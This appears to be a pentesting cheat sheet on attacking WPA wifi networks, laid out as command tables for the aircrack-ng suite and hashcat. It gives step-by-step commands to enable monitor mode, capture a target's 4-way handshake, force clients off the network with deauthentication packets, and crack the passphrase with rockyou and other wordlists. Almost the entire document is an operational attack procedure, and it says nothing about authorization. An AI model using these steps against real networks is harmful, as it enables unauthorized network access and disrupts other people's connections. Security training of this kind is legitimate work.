# <a id="top-of-page"></a> WiFi Attacks

### Links

- WPA Exploitation
  - [Setup](#setup)
  - [Packet Capture (4-way handshake)](#capture)
  - [Deauthentication Process](#deauth)
  - [Password Cracking](#passCracking)

### Tools

[aircrack-ng](https://www.aircrack-ng.org/)</br>
[Crunch](https://www.kali.org/tools/crunch/)</br>
[CEWL](https://www.kali.org/tools/cewl/)</br>
[cap2hccapx](https://www.kali.org/tools/hashcat-utils/)</br>
[Hashcat](https://hashcat.net/hashcat/)

# WPA Exploitation

## <a id="setup"></a> -Setup-

### --Kill Interrupting Services--

Before enabling monitoring mode, identify and kill services that might interrupt the process.

| **Command**                              | **Description**                                               |
| ---------------------------------------- | ------------------------------------------------------------- |
| `sudo airmon-ng check <WIRELESS_CARD>`   | Check the wireless card available on the attacker distro.     |
| `sudo ip link set <PRE-NAME> name wlan0` | (OPTIONAL) Change the wifi extension name to something else.  |
| `sudo airmon-ng check kill`              | Kill any process that will interfere with the capture/attack. |

### --Enable Monitoring Mode--

| **Command**                        | **Description**                     |
| ---------------------------------- | ----------------------------------- |
| `sudo ifconfig wlan0 down`         | Bring the wifi interface down.      |
| `sudo iwconfig wlan0 mode monitor` | Move the interface to monitor mode. |
| `sudo ifconfig wlan0 up`           | Bring the wifi interface up.        |
| `sudo iwconfig`                    | Verify the mode is monitor.         |

[Back to top](#top-of-page)

</br>

## <a id="capture"></a> -Packet Capture (4-way handshake)-

### --Capture BSSID and Monitor Network--

Run the monitor in induvidual terminal, this can take some time to get the partial-handshake. A successful capture will show at the top of the terminal with something like the following. Once that is seen stop the termminal with `CTRL+C`.

`WPA Handshake: B0:6E:BF:48:E5:98`

| **Command**                                                                         | **Description**                                           |
| ----------------------------------------------------------------------------------- | --------------------------------------------------------- |
| `sudo airodump-ng wlan0`                                                            | Run the scan just in CLI stdout.                          |
| `sudo airodump-ng -w <OUTPUT_NAME> wlan0`                                           | Run the scan and output all info to file.                 |
| `sudo airodump-ng -c <CHANNEL_ID> -w <OUTPUT_NAME> --bssid EW:WV:4H:J7:A5:28 wlan0` | Select the specific BSSID for monitoring and run command. |

[Back to top](#top-of-page)

</br>

## <a id="deauth"></a> -Deauthentication Process-

Deauth packets will not work on WPA3 networks or if certain protections are enabled on WPA networks. This can take some time so run this in an induvidual terminal. Stop this terminal with `CTRL+C` when the handshake is captured.

| **Command**                                        | **Description**                          |
| -------------------------------------------------- | ---------------------------------------- |
| `sudo aireplay-ng -0 0 -a EW:WV:4H:J7:A5:28 wlan0` | Send deauth packets to target broadcast. |

[Back to top](#top-of-page)

</br>

## <a id="passCracking"></a> -Password Cracking-

### --Converting the output file--

Before the password using hashcat, the file needs to be converted from a .cap file to the equivalent hashcat file format .hccapx. This can be done by either uploading the .cap file to https://hashcat.net/cap2hccapx/ or using the cap2hccapx tool directly in the cli.

| **Command**                               | **Description**            |
| ----------------------------------------- | -------------------------- |
| `cap2hccapx.bin hackme.cap hackme.hccapx` | Conversion using CLI tool. |

### --Selecting the wordlist to run--

Wordlists can vary in size and effectiveness. Custom wordlists through the use of OSINT and tools like [cewl](https://www.kali.org/tools/cewl/) can assist in generating more curtailed lists to the target. Additionally tools like [Crunch](https://www.kali.org/tools/crunch/) can be used to generate possible passwords based on criteria provided (8 chars, only numbers, etc...).

Below is a simple list of wordlists that could potentially be of use out-of-the-box.

- [rockyou.txt](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- [Probable-Wordlists WPA-length](https://github.com/berzerk0/Probable-Wordlists/tree/master/Real-Passwords/WPA-Length)
- [wpa2-wordlists](https://github.com/kennyn510/wpa2-wordlists)

### --Cracking the password--

The use of Hashcat is more effective when leveraging GPU strength. If using a windows device, additional downloads will be necessary to leverage the GPU.

Brute forcing is a last ditch option, information on brute forcing with Hashcat can be found [HERE](https://brezular.com/2021/07/01/cracking-wpa-wpa2-pre-shared-key-using-gpu/).

| **Command**                                             | **Description**      |
| ------------------------------------------------------- | -------------------- |
| `hashcat.exe -m 2500 output_file-01.hccapx rockyou.txt` | Cracking on Windows. |
